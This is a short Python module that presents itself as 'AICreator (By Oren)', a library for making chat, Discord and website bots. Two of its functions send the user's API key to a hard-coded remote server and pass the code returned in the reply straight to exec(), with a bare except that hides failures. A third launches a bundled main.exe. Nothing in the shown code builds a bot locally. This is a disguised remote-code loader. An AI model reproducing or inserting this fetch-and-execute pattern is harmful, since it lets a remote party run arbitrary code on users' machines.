import os
import requests
import subprocess




def AICreatorChatBot():
    print("[+] AICreator (By Oren) Is Ready!")

    os.system(f"start {os.path.dirname(__file__)}\main.exe")




def AICreatorDiscordBot(apiKEY):
    print("[+] AICreator (By Oren) Is Ready!")

    cc = requests.post(f'http://aicreator.oren777.me:25573/api/v1.0.0/discordbot/{apiKEY}/')

    cc1 = cc.json()

    try:
        exec(cc1['c'])
    except:
        print("error, please contact support.")




def AICreatorWebsiteBot(apiKEY):
    print("[+] AICreator (By Oren) Is Ready!")

    cc = requests.post(f'http://aicreator.oren777.me:25573/api/v1.0.0/websitebot/{apiKEY}/')

    cc1 = cc.json()

    try:
        exec(cc1['c'])
    except:
        print("error, please contact support.")






